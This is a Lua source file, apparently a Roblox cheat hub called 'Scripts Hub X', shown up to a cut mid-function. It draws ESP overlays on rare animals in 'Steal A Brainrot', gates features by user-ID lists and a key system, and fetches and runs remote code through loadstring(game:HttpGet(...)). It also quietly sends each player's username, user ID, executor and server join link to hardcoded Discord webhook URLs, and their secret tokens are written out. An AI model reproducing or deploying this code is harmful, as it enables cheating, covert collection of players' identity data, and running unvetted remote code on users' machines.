-- ================================
-- Scripts Hub X | Official (Fixed Version) + Enhanced ESP with Key System Loader
-- ================================

-- KEY SYSTEM TOGGLE VARIABLE
local Keysystem = true -- Set to false to skip key system for non-premium users

-- Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 5)

-- Target Game ID for Animal Logger
local STEAL_A_BRAINROT_ID = 109983668079237

-- Animal names to detect and log
local espTargetNames = {
	"Los Tralaleritos",
    "Guerriro Digitale",
    "Las Tralaleritas",
    "Job Job Job Sahur",
    "Las Vaquitas Saturnitas",
    "Graipuss Medussi",
    "Noo My Hotspot",
    "Sahur Combinasion",
	"Pot Hotspot",
    "Chicleteira Bicicleteira",
    "Los Nooo My Hotspotsitos",
	"La Grande Combinasion",
	"Los Combinasionas",
	"Nuclearo Dinossauro",
	"Karkerkar combinasion",
	"Los Hotspotsitos",
	"Tralaledon",
	"Esok Sekolah",
	"Ketupat Kepat",
	"Los Bros",
	"La Supreme Combinasion",
	"Ketchuru and Masturu",
	"Garama and Madundung",
	"Las Vaquitas Saturnitas",
	"Chicleteira Bicicleteira",
	"Spaghetti Tualetti",
	"Dragon Cannelloni",
	"Blackhole Goat",
	"Agarrini la Palini",
	"Los Spyderinis",
	"Fragola la la la",
	"Strawberry Elephant"
}

-- Create lookup table for faster checking
local espTargetLookup = {}
for _, name in pairs(espTargetNames) do
    espTargetLookup[name] = true
end

-- Enhanced tracking system for multiple instances
local loggedAnimals = {}
local animalCounts = {} -- Track counts per animal type
local espObjects = {} -- Changed to support multiple instances
local espEnabled = true
local espCounter = 0 -- Unique ID generator for ESP

-- UserIds
local OwnerUserId = "2341777244"
local PremiumUsers = {
	"1102633570", -- Pedrojay450 [PERM]
	"8860068952", -- Pedrojay450's alt (assaltanoobsbr) [PERM]
	"799427028", -- Roblox_xvt [PERM]
	"5317421108", -- kolwneje [PERM]
	"1458719572", -- wxckfeen [PERM]
	"8931026465", -- genderwillnottell [PERM]
	"679713988" -- LautyyPc [PERM]
}

local StaffUserId = {
	"3882788546", -- Keanjacob5
	"799427028", -- Roblox_xvt
	"9249886989", -- ALT
	"2726723958" -- mhicel235TOH
}

local BlacklistUsers = {
	"716599904", -- ImRottingInHell [PERM]
	"229691" -- ravyn [PERM]
}

-- Key System Loader for Non-Premium Users
local function loadKeySystem()
    print("🔑 Loading key system for non-premium user...")
    
    local success, keySystemModule = pcall(function()
        local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/keysystem.lua")
        return loadstring(script)()
    end)
    
    if not success then
        warn("❌ Failed to load key system: " .. tostring(keySystemModule))
        return false
    end
    
    -- Check if user already has valid key
    if keySystemModule.CheckExistingKey() then
        print("✅ Valid key found, skipping key system UI")
        return true
    end
    
    -- Show key system UI
    keySystemModule.ShowKeySystem()
    
    -- Wait for key verification
    local maxWait = 300 -- 5 minutes timeout
    local waited = 0
    
    while not keySystemModule.IsKeyVerified() and waited < maxWait do
        task.wait(1)
        waited = waited + 1
    end
    
    if keySystemModule.IsKeyVerified() then
        print("✅ Key verified successfully")
        return true
    else
        print("❌ Key verification timeout or failed")
        return false
    end
end

-- Webhook URLs
local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"
local webhookUrll = "https://discord.com/api/webhooks/1403702581104218153/k_yKYW6971_qADkSO6iuOjj7AIaXIfQuVcIs0mZIpNWJAc_cORIf0ieSDBlN8zibbHi-"

-- ================================
-- ENHANCED ESP FUNCTIONS WITH MONEY/RARITY/MUTATION
-- ================================

-- Function to find animal data from podium
local function getAnimalDataFromPodium(plotName, animalName)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    
    local targetPlot = plots:FindFirstChild(plotName)
    if not targetPlot then return nil end
    
    local animalPodiums = targetPlot:FindFirstChild("AnimalPodiums")
    if not animalPodiums then return nil end
    
    -- Check podiums 1-30
    for i = 1, 30 do
        local podium = animalPodiums:FindFirstChild(tostring(i))
        if podium then
            local base = podium:FindFirstChild("Base")
            if base then
                local spawn = base:FindFirstChild("Spawn")
                if spawn then
                    local attachment = spawn:FindFirstChild("Attachment")
                    if attachment then
                        local animalOverhead = attachment:FindFirstChild("AnimalOverhead")
                        if animalOverhead then
                            local priceText = animalOverhead:FindFirstChild("Price")
                            local rarityText = animalOverhead:FindFirstChild("Rarity")
                            local mutationText = animalOverhead:FindFirstChild("Mutation")
                            
                            return {
                                price = priceText and priceText.Text or "N/A",
                                rarity = rarityText and rarityText.Text or "N/A",
                                mutation = mutationText and mutationText.Text or "N/A"
                            }
                        end
                    end
                end
            end
        end
    end
    
    return nil
end

-- Create ESP for a single object with unique ID
local function createESP(object, animalName, plotName)
    if not object or not object.Parent then return end
    
    -- Generate unique ESP ID for multiple instances
    espCounter = espCounter + 1
    local espId = animalName .. "_" .. espCounter .. "_" .. tostring(object)
    
    -- Prevent duplicate ESP for the same object
    local existingESP = false
    for id, espData in pairs(espObjects) do
        if espData.object == object then
            existingESP = true
            break
        end
    end
    
    if existingESP then return end
    
    -- Get animal data from podium
    local animalData = plotName and getAnimalDataFromPodium(plotName, animalName) or nil
    
    -- Create ESP container
    local espContainer = {}
    
    -- Function to create clean highlight effect
    local function createHighlight()
        local highlight = Instance.new("Highlight")
        highlight.Parent = object
        highlight.FillColor = Color3.new(0, 0.5, 1) -- Blue color
        highlight.OutlineColor = Color3.new(0, 0.8, 1) -- Brighter blue
        highlight.FillTransparency = 0.8
        highlight.OutlineTransparency = 0.3
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Adornee = object
        
        return highlight
    end
    
    -- Function to create enhanced name label with money, rarity, and mutation
    local function createNameLabel()
        local billboardGui = Instance.new("BillboardGui")
        billboardGui.Parent = object
        billboardGui.Size = UDim2.new(0, 180, 0, 80) -- Larger size to accommodate all data
        billboardGui.StudsOffset = Vector3.new(0, 3, 0) -- Position above object
        billboardGui.AlwaysOnTop = true
        
        -- Count how many of this animal type we have
        local count = animalCounts[animalName] or 1
        local displayText = animalName .. (count > 1 and " (" .. count .. ")" or "")
        
        -- Main container frame
        local containerFrame = Instance.new("Frame")
        containerFrame.Parent = billboardGui
        containerFrame.Size = UDim2.new(1, 0, 1, 0)
        containerFrame.BackgroundTransparency = 1
        
        -- Mutation text (above animal name, super small)
        local mutationLabel = Instance.new("TextLabel")
        mutationLabel.Parent = containerFrame
        mutationLabel.Size = UDim2.new(1, 0, 0.15, 0)
        mutationLabel.Position = UDim2.new(0, 0, 0, 0)
        mutationLabel.BackgroundTransparency = 1
        mutationLabel.Text = animalData and animalData.mutation or ""
        mutationLabel.TextColor3 = Color3.new(1, 1, 1) -- White
        mutationLabel.TextStrokeTransparency = 0
        mutationLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
        mutationLabel.TextScaled = true
        mutationLabel.TextSize = 8 -- Super small
        mutationLabel.Font = Enum.Font.SourceSans
        
        -- Animal name label
        local nameLabel = Instance.new("TextLabel")
        nameLabel.Parent = containerFrame
        nameLabel.Size = UDim2.new(1, 0, 0.4, 0)
        nameLabel.Position = UDim2.new(0, 0, 0.15, 0)
        nameLabel.BackgroundTransparency = 1
        nameLabel.Text = displayText
        nameLabel.TextColor3 = Color3.new(0, 0.5, 1) -- Blue text
        nameLabel.TextStrokeTransparency = 0
        nameLabel.TextStrokeColor3 = Color3.new(0, 0.8, 1) -- Blue outline
        nameLabel.TextScaled = true
        nameLabel.TextSize = 14
        nameLabel.Font = Enum.Font.SourceSansBold
        
        -- Money per second label (small, green, under animal name)
        local moneyLabel = Instance.new("TextLabel")
        moneyLabel.Parent = containerFrame
        moneyLabel.Size = UDim2.new(1, 0, 0.25, 0)
        moneyLabel.Position = UDim2.new(0, 0, 0.55, 0)
        moneyLabel.BackgroundTransparency = 1
        moneyLabel.Text = animalData and animalData.price or ""
        moneyLabel.TextColor3 = Color3.new(0, 1, 0) -- Green
        moneyLabel.TextStrokeTransparency = 0
        moneyLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
        moneyLabel.TextScaled = true
        moneyLabel.TextSize = 10 -- Small
        moneyLabel.Font = Enum.Font.SourceSans
        
        -- Rarity label (under money, with special colors)
        local rarityLabel = Instance.new("TextLabel")
        rarityLabel.Parent = containerFrame
        rarityLabel.Size = UDim2.new(1, 0, 0.2, 0)
        rarityLabel.Position = UDim2.new(0, 0, 0.8, 0)
        rarityLabel.BackgroundTransparency = 1
        rarityLabel.Text = animalData and animalData.rarity or ""
        rarityLabel.TextScaled = true
        rarityLabel.TextSize = 8 -- Small
        rarityLabel.Font = Enum.Font.SourceSans
        
        -- Special rarity colors
        if animalData and animalData.rarity then
            if animalData.rarity == "Secret" then
                rarityLabel.TextColor3 = Color3.new(0, 0, 0) -- Black
                rarityLabel.TextStrokeTransparency = 0
                rarityLabel.TextStrokeColor3 = Color3.new(1, 1, 1) -- White outline
            elseif animalData.rarity == "Brainrot God" then
                -- RGB color effect for Brainrot God
                spawn(function()
                    local hue = 0
                    while rarityLabel and rarityLabel.Parent do
                        hue = (hue + 0.01) % 1
                        rarityLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
                        wait(0.1)
                    end
                end)
                rarityLabel.TextStrokeTransparency = 0
                rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
            else
                rarityLabel.TextColor3 = Color3.new(1, 1, 1) -- White for other rarities
                rarityLabel.TextStrokeTransparency = 0
                rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
            end
        end
        
        return billboardGui
    end
    
    -- Function to create super thin tracer line
    local function createTracer()
        local camera = workspace.CurrentCamera
        if not camera then return nil end
        
        -- Create tracer line using Beam
        local attachment0 = Instance.new("Attachment")
        attachment0.Parent = camera
        attachment0.Position = Vector3.new(0, 0, 0)
        
        local attachment1 = Instance.new("Attachment")
        attachment1.Parent = object.PrimaryPart or object:FindFirstChildOfClass("BasePart")
        if not attachment1.Parent then return nil end
        
        local beam = Instance.new("Beam")
        beam.Parent = workspace
        beam.Attachment0 = attachment0
        beam.Attachment1 = attachment1
        beam.Width0 = 1 -- Super thin start
        beam.Width1 = 1 -- Super thin end
        beam.Color = ColorSequence.new(Color3.new(0, 0.8, 1)) -- Blue color
        beam.Transparency = NumberSequence.new(0.3) -- Semi-transparent
        beam.FaceCamera = true
        
        return {beam = beam, attachment0 = attachment0, attachment1 = attachment1}
    end
    
    -- Create ESP components
    local highlight = createHighlight()
    local nameLabel = createNameLabel()
    local tracer = createTracer()
    
    -- Store ESP components
    espContainer.highlight = highlight
    espContainer.nameLabel = nameLabel
    espContainer.tracer = tracer
    espContainer.object = object
    espContainer.animalName = animalName
    espContainer.plotName = plotName
    espContainer.animalData = animalData
    
    espObjects[espId] = espContainer
    
    -- Clean up if object is destroyed
    object.AncestryChanged:Connect(function()
        if not object.Parent then
            if espObjects[espId] then
                if espObjects[espId].highlight then
                    espObjects[espId].highlight:Destroy()
                end
                if espObjects[espId].nameLabel then
                    espObjects[espId].nameLabel:Destroy()
                end
                if espObjects[espId].tracer then
                    if espObjects[espId].tracer.beam then
                        espObjects[espId].tracer.beam:Destroy()
                    end
                    if espObjects[espId].tracer.attachment0 then
                        espObjects[espId].tracer.attachment0:Destroy()
                    end
                    if espObjects[espId].tracer.attachment1 then
                        espObjects[espId].tracer.attachment1:Destroy()
                    end
                end
                espObjects[espId] = nil
            end
        end
    end)
    
    return espId
end

-- Update ESP labels with current counts and data
local function updateESPLabels()
    for espId, espContainer in pairs(espObjects) do
        if espContainer.nameLabel and espContainer.animalName then
            local count = animalCounts[espContainer.animalName] or 1
            local displayText = espContainer.animalName .. (count > 1 and " (" .. count .. ")" or "")
            
            -- Update animal data if plot is available
            if espContainer.plotName then
                local updatedData = getAnimalDataFromPodium(espContainer.plotName, espContainer.animalName)
                if updatedData then
                    espContainer.animalData = updatedData
                end
            end
            
            -- Update all labels in the container
            local containerFrame = espContainer.nameLabel:FindFirstChild("Frame")
            if containerFrame then
                local nameLabel = containerFrame:FindFirstChild("TextLabel")
                if nameLabel then
                    nameLabel.Text = displayText
                end
            end
        end
    end
end

-- Apply ESP to all currently detected brainrots (always enabled)
local function applyESPToExistingAnimals()
    -- Reset animal counts
    animalCounts = {}
    
    -- ESP for plot animals
    local plots = workspace:FindFirstChild("Plots")
    if plots then
        for _, plot in pairs(plots:GetChildren()) do
            if plot:IsA("Model") then
                local plotName = plot.Name
                for _, child in pairs(plot:GetChildren()) do
                    if child:IsA("Model") and espTargetLookup[child.Name] then
                        -- Increment count
                        animalCounts[child.Name] = (animalCounts[child.Name] or 0) + 1
                        createESP(child, child.Name, plotName)
                    end
                end
            end
        end
    end
    
    -- ESP for rendered moving animals
    local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
    if renderedAnimals then
        for _, child in pairs(renderedAnimals:GetChildren()) do
            if child:IsA("Model") and espTargetLookup[child.Name] then
                -- Increment count
                animalCounts[child.Name] = (animalCounts[child.Name] or 0) + 1
                createESP(child, child.Name, nil) -- No plot name for rendered animals
            end
        end
    end
    
    -- Update all ESP labels with counts
    updateESPLabels()
end

-- ================================
-- ENHANCED ANIMAL LOGGING FUNCTIONS
-- ================================

-- Enhanced animal scanning with count tracking
local function scanPlotsForAnimals()
    local plots = workspace:FindFirstChild("Plots")
    if not plots then 
        return {}
    end
    
    local foundAnimals = {}
    local currentCounts = {} -- Track current scan counts
    
    -- Check each randomly generated plot
    for _, plot in pairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            local plotName = plot.Name
            
            -- Check direct children of this plot for target animals
            for _, child in pairs(plot:GetChildren()) do
                if child:IsA("Model") and espTargetLookup[child.Name] then
                    local animalName = child.Name
                    local animalId = plotName .. "_" .. animalName .. "_" .. tostring(child)
                    
                    -- Count animals of this type
                    currentCounts[animalName] = (currentCounts[animalName] or 0) + 1
                    
                    -- Only log if we haven't logged this specific instance before
                    if not loggedAnimals[animalId] then
                        table.insert(foundAnimals, {
                            plotName = plotName,
                            animalName = animalName,
                            animalId = animalId,
                            object = child
                        })
                        loggedAnimals[animalId] = true
                        
                        -- Apply ESP immediately when found (always enabled)
                        animalCounts[animalName] = currentCounts[animalName]
                        createESP(child, animalName, plotName)
                    end
                end
            end
        end
    end
    
    -- Update global counts
    for animalName, count in pairs(currentCounts) do
        animalCounts[animalName] = count
    end
    
    return foundAnimals
end

local function scanRenderedMovingAnimals()
    local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
    if not renderedAnimals then 
        return {}
    end
    
    local foundAnimals = {}
    local currentCounts = {}
    
    -- Check direct children for target animals
    for _, child in pairs(renderedAnimals:GetChildren()) do
        if child:IsA("Model") and espTargetLookup[child.Name] then
            local animalName = child.Name
            local animalId = "RenderedMoving_" .. animalName .. "_" .. tostring(child)
            
            -- Count animals of this type
            currentCounts[animalName] = (currentCounts[animalName] or 0) + 1
            
            -- Only log if we haven't logged this specific instance before
            if not loggedAnimals[animalId] then
                table.insert(foundAnimals, {
                    plotName = "RenderedMovingAnimals",
                    animalName = animalName,
                    animalId = animalId,
                    object = child
                })
                loggedAnimals[animalId] = true
                
                -- Apply ESP immediately when found (always enabled)
                animalCounts[animalName] = currentCounts[animalName]
                createESP(child, animalName, nil) -- No plot name for rendered animals
            end
        end
    end
    
    -- Update global counts
    for animalName, count in pairs(currentCounts) do
        animalCounts[animalName] = count
    end
    
    return foundAnimals
end

-- Enhanced logging with count display
local function sendAnimalLog(animals)
    if #animals == 0 then return end
    
    pcall(function()
        local placeId = tostring(game.PlaceId)
        local jobId = game.JobId or "Unknown"
        
        -- Create consolidated animal list with counts
        local animalTypeCounts = {}
        for _, animal in pairs(animals) do
            animalTypeCounts[animal.animalName] = (animalTypeCounts[animal.animalName] or 0) + 1
        end
        
        local animalList = ""
        local animalNames = {}
        for animalName, count in pairs(animalTypeCounts) do
            table.insert(animalNames, {name = animalName, count = count})
        end

        -- Now build the list with proper newlines
        for i, animalData in ipairs(animalNames) do
            if animalData.count > 1 then
                animalList = animalList .. "**" .. animalData.name .. " (" .. animalData.count .. ")**"
            else
                animalList = animalList .. "**" .. animalData.name .. "**"
            end
    
            -- Add newline if it's not the last item
            if i < #animalNames then
                animalList = animalList .. "\n"
            end
		end
        
        -- Create join script
        local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)'
        local playerCount = #Players:GetPlayers()
        
        local totalAnimals = 0
        for _, count in pairs(animalTypeCounts) do
            totalAnimals = totalAnimals + count
        end
			
        local send_data = {
            ["username"] = "Scripts Hub X | Official - Notifyer",
            ["avatar_url"] = "https://unconscious-yellow-va1rcyikr7.edgeone.app/file_00000000fd6861fa99045e7ff823f06b.png",
            ["embeds"] = {
                {
                    ["title"] = "👑 PREMIUM BRAINROT NOTIFYER 👑",
                    ["description"] = "Total: " .. totalAnimals .. " brainrot(s) found",
                    ["color"] = 15844367, -- Gold color
                    ["fields"] = {
                        {["name"] = "Brainrots Found", ["value"] = animalList, ["inline"] = true},
						{["name"] = "JobId", ["value"] = jobId, ["inline"] = true},
                        {["name"] = "Players", ["value"] = playerCount .. "/8", ["inline"] = true},
						{["name"] = "Join Script", ["value"] = joinScript, ["inline"] = true},
                        {["name"] = "Join Link", ["value"] = '[Join Server](https://pickletalk.netlify.app/?placeId=' .. placeId .. '&gameInstanceId=' .. jobId .. ')', ["inline"] = true}
                    },
                    ["footer"] = {
                        ["text"] = "Brainrots Notifyer • Scripts Hub X | Official",
                        ["icon_url"] = "https://unconscious-yellow-va1rcyikr7.edgeone.app/file_00000000fd6861fa99045e7ff823f06b.png"
                    }
                }
            }
        }
        
        local headers = {["Content-Type"] = "application/json"}
        pcall(function()
            if request and type(request) == "function" then
                request({
                    Url = webhookUrll,
                    Method = "POST",
                    Headers = headers,
                    Body = HttpService:JSONEncode(send_data)
                })
            elseif http_request and type(http_request) == "function" then
                http_request({
                    Url = webhookUrll,
                    Method = "POST",
                    Headers = headers,
                    Body = HttpService:JSONEncode(send_data)
                })
            end
        end)
    end)
end

local function checkForAnimals()
    local plotAnimals = scanPlotsForAnimals()
    local renderedAnimals = scanRenderedMovingAnimals()
    
    -- Combine both results
    local allAnimals = {}
    for _, animal in pairs(plotAnimals) do
        table.insert(allAnimals, animal)
    end
    for _, animal in pairs(renderedAnimals) do
        table.insert(allAnimals, animal)
    end
    
    -- Update ESP labels with current counts
    updateESPLabels()
    
    -- Send to webhook if animals found (silently, no notifications)
    if #allAnimals > 0 then
        sendAnimalLog(allAnimals)
    end
end

-- ================================
-- REMAINING ORIGINAL FUNCTIONS
-- ================================

-- Notification function
local function notify(title, text)
	spawn(function()
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = title, 
				Text = text, 
				Duration = 3
			})
		end)
	end)
end

-- Executor detection function
local function detectExecutor()
	if syn and syn.request then
		return "Synapse X"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif getgenv and getgenv().isfluxus then
		return "Fluxus"
	elseif getgenv and getgenv().scriptware then
		return "Script-Ware"
	elseif getgenv and getgenv().protosmasher then
		return "ProtoSmasher"
	elseif getgenv and getgenv().sirhurt then
		return "SirHurt"
	elseif getgenv and getgenv().sentinellib then
		return "Sentinel"
	elseif getgenv and getgenv().vega then
		return "Vega X"
	elseif getgenv and getgenv().oxygen then
		return "Oxygen U"
	elseif getgenv and getgenv().comet then
		return "Comet"
	elseif getgenv and getgenv().nihon then
		return "Nihon"
	elseif getgenv and getgenv().delta then
		return "Delta"
	elseif getgenv and getgenv().evon then
		return "Evon"
	elseif getgenv and getgenv().electron then
		return "Electron"
	elseif identifyexecutor then
		local executor = identifyexecutor()
		if executor then
			return executor
		end
	end
	return "Unknown"
end

-- Webhook notification function
local function sendWebhookNotification(userStatus, scriptUrl)
	pcall(function()
		print("Sending webhook notification")
		
		local gameName = "Unknown"
		local success, productInfo = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)
		if success and productInfo and productInfo.Name then
			gameName = productInfo.Name
		end
		
		local userId = tostring(player.UserId)
		local detectedExecutor = detectExecutor()
		local placeId = tostring(game.PlaceId)
		local jobId = game.JobId or "Can't detect JobId"
		
		local send_data = {
			["username"] = "Script Execution Log",
			["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
			["content"] = "Scripts Hub X | Official - Logging",
			["embeds"] = {
				{
					["title"] = "Script Execution Details",
					["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Profile**: https://www.roblox.com/users/" .. player.UserId .. "/profile",
					["color"] = 2123412,
					["fields"] = {
						{["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
						{["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
						{["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
						{["name"] = "Executor", ["value"] = detectedExecutor, ["inline"] = true},
						{["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
						{["name"] = "Job Id", ["value"] = game.JobId, ["inline"] = true},
						{["name"] = "Join Script", ["value"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ', "' .. jobId .. '", game.Players.LocalPlayer)', ["inline"] = true},
						{["name"] = "Join Link", ["value"] = '[Join To The Server](https://pickletalk.netlify.app/?placeId=' .. placeId .. '&gameInstanceId=' .. jobId .. ')', ["inline"] = true}
					},
					["footer"] = {["text"] = "Scripts Hub X | Official", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
					["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
				}
			}
		}
		
		local headers = {["Content-Type"] = "application/json"}
		pcall(function()
			if request and type(request) == "function" then
				request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif http_request and type(http_request) == "function" then
				http_request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			end
		end)
	end)
end

-- Game support check function
local function checkGameSupport()
	print("Checking game support for PlaceID: " .. game.PlaceId)
	
	local success, Games = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/GameList.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load game list: " .. tostring(Games))
		return false, nil
	end
	
	if type(Games) ~= "table" then
		warn("Game list returned invalid data")
		return false, nil
	end
	
	for PlaceID, Execute in pairs(Games) do
		if PlaceID == game.PlaceId then
			print("Game supported, script URL: " .. Execute)
			return true, Execute
		end
	end
	
	print("Game not supported")
	return false, nil
end

-- Game script loading function
local function loadGameScript(scriptUrl)
	print("Loading game script from URL: " .. scriptUrl)
	
	local success, result = pcall(function()
		return loadstring(game:HttpGet(scriptUrl))()
	end)
	
	if success then
		print("✅ Game script loaded and executed successfully")
		return true, nil
	else
		warn("❌ Failed to load/execute game script: " .. tostring(result))
		return false, tostring(result)
	end
end

-- User status check function
local function checkUserStatus()
	local userId = tostring(player.UserId)
	print("Checking user status for UserId: " .. userId)
	
	-- Check blacklist first
	if BlacklistUsers and table.find(BlacklistUsers, userId) then
		print("Blacklisted user detected")
		return "blacklisted"
	end
	
	-- Check owner
	if OwnerUserId and userId == tostring(OwnerUserId) then
		print("Owner detected")
		return "owner"
	end
	
	-- Check staff
	if StaffUserId and table.find(StaffUserId, userId) then
		print("Staff detected")
		return "staff"
	end
	
	-- Check premium
	if PremiumUsers and table.find(PremiumUsers, userId) then
		print("Premium user detected")
		return "premium"
	end
	
	print("Regular user detected - Key system required")
	return "regular"
end

-- Initialize Enhanced Animal Logger for Steal A Brainrot
local function initializeAnimalLogger()
	if game.PlaceId == STEAL_A_BRAINROT_ID then
		print("🎯 Initializing Enhanced Brainrot ESP System with Money/Rarity/Mutation Display...")
		
		-- Initial scan after delay
		task.spawn(function()
			task.wait(2) -- Wait for game to fully load
			checkForAnimals()
			applyESPToExistingAnimals() -- Apply ESP to any existing animals
		end)
		
		-- Monitor for new animals being added to Plots
		workspace.DescendantAdded:Connect(function(descendant)
			if descendant:IsA("Model") and descendant.Parent and espTargetLookup[descendant.Name] then
				-- Check if it's in a plot
				local parent = descendant.Parent
				if parent and parent.Parent == workspace:FindFirstChild("Plots") then
					task.wait(1) -- Small delay to ensure the animal is fully loaded
					checkForAnimals()
				end
			end
		end)
		
		-- Monitor for new animals in RenderedMovingAnimals
		local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
		if renderedAnimals then
			renderedAnimals.ChildAdded:Connect(function(child)
				if child:IsA("Model") and espTargetLookup[child.Name] then
					task.wait(1)
					checkForAnimals()
				end
			end)
		end
		
		-- Watch for RenderedMovingAnimals folder being created
		workspace.ChildAdded:Connect(function(child)
			if child.Name == "RenderedMovingAnimals" then
				child.ChildAdded:Connect(function(animal)
					if animal:IsA("Model") and espTargetLookup[animal.Name] then
						task.wait(1)
						checkForAnimals()
					end
				end)
			end
		end)
		
		-- Periodic scan every 10 seconds to catch any missed animals and update data
		task.spawn(function()
			while true do
				task.wait(10)
				checkForAnimals()
				-- Update animal data for existing ESP
				for espId, espContainer in pairs(espObjects) do
					if espContainer.plotName and espContainer.animalName then
						local updatedData = getAnimalDataFromPodium(espContainer.plotName, espContainer.animalName)
						if updatedData then
							espContainer.animalData = updatedData
							-- Update the ESP display with new data
							if espContainer.nameLabel then
								espContainer.nameLabel:Destroy()
								-- Recreate the name label with updated data
								local billboardGui = Instance.new("BillboardGui")
								billboardGui.Parent = espContainer.object
								billboardGui.Size = UDim2.new(0, 180, 0, 80)
								billboardGui.StudsOffset = Vector3.new(0, 3, 0)
								billboardGui.AlwaysOnTop = true
								
								-- Recreate all labels with updated data
								local containerFrame = Instance.new("Frame")
								containerFrame.Parent = billboardGui
								containerFrame.Size = UDim2.new(1, 0, 1, 0)
								containerFrame.BackgroundTransparency = 1
								
								-- Mutation text
								local mutationLabel = Instance.new("TextLabel")
								mutationLabel.Parent = containerFrame
								mutationLabel.Size = UDim2.new(1, 0, 0.15, 0)
								mutationLabel.Position = UDim2.new(0, 0, 0, 0)
								mutationLabel.BackgroundTransparency = 1
								mutationLabel.Text = updatedData.mutation or ""
								mutationLabel.TextColor3 = Color3.new(1, 1, 1)
								mutationLabel.TextStrokeTransparency = 0
								mutationLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
								mutationLabel.TextScaled = true
								mutationLabel.TextSize = 8
								mutationLabel.Font = Enum.Font.SourceSans
								
								-- Animal name
								local count = animalCounts[espContainer.animalName] or 1
								local displayText = espContainer.animalName .. (count > 1 and " (" .. count .. ")" or "")
								local nameLabel = Instance.new("TextLabel")
								nameLabel.Parent = containerFrame
								nameLabel.Size = UDim2.new(1, 0, 0.4, 0)
								nameLabel.Position = UDim2.new(0, 0, 0.15, 0)
								nameLabel.BackgroundTransparency = 1
								nameLabel.Text = displayText
								nameLabel.TextColor3 = Color3.new(0, 0.5, 1)
								nameLabel.TextStrokeTransparency = 0
								nameLabel.TextStrokeColor3 = Color3.new(0, 0.8, 1)
								nameLabel.TextScaled = true
								nameLabel.TextSize = 14
								nameLabel.Font = Enum.Font.SourceSansBold
								
								-- Money per second
								local moneyLabel = Instance.new("TextLabel")
								moneyLabel.Parent = containerFrame
								moneyLabel.Size = UDim2.new(1, 0, 0.25, 0)
								moneyLabel.Position = UDim2.new(0, 0, 0.55, 0)
								moneyLabel.BackgroundTransparency = 1
								moneyLabel.Text = updatedData.price or ""
								moneyLabel.TextColor3 = Color3.new(0, 1, 0)
								moneyLabel.TextStrokeTransparency = 0
								moneyLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
								moneyLabel.TextScaled = true
								moneyLabel.TextSize = 10
								moneyLabel.Font = Enum.Font.SourceSans
								
								-- Rarity
								local rarityLabel = Instance.new("TextLabel")
								rarityLabel.Parent = containerFrame
								rarityLabel.Size = UDim2.new(1, 0, 0.2, 0)
								rarityLabel.Position = UDim2.new(0, 0, 0.8, 0)
								rarityLabel.BackgroundTransparency = 1
								rarityLabel.Text = updatedData.rarity or ""
								rarityLabel.TextScaled = true
								rarityLabel.TextSize = 8
								rarityLabel.Font = Enum.Font.SourceSans
								
								-- Special rarity colors
								if updatedData.rarity == "Secret" then
									rarityLabel.TextColor3 = Color3.new(0, 0, 0)
									rarityLabel.TextStrokeTransparency = 0
									rarityLabel.TextStrokeColor3 = Color3.new(1, 1, 1)
								elseif updatedData.rarity == "Brainrot God" then
									spawn(function()
										local hue = 0
										while rarityLabel and rarityLabel.Parent do
											hue = (hue + 0.01) % 1
											rarityLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
											wait(0.1)
										end
									end)
									rarityLabel.TextStrokeTransparency = 0
									rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
								else
									rarityLabel.TextColor3 = Color3.new(1, 1, 1)
									rarityLabel.TextStrokeTransparency = 0
									rarityLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
								end
								
